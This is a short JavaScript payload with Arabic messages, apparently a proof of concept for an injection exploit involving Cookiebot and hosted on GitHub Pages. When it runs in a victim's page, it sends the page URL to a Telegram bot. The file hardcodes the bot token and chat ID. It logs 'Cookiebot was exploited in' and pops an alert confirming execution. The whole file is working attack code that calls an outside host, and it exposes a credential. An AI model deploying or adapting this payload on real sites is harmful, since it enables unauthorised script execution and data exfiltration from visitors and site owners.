console.log("🚨 محاولة إرسال تليجرام...");

fetch("https://api.telegram.org/bot7418874172:AAFy2mvuxosCEGJEKUls4EoXaSIcjfJ82Ac/sendMessage", {
  method: "POST",
  headers: {
    "Content-Type": "application/json"
  },
  body: JSON.stringify({
    chat_id: "6929699769",
    text: "🚨 Cookiebot تم استغلاله في: " + location.href
  })
})
.then(res => res.text())
.then(text => {
  console.log("✅ رد تليجرام:", text);
})
.catch(err => {
  console.error("❌ فشل الإرسال:", err);
});

alert("🔥 تم تنفيذ السكربت من GitHub Pages!");
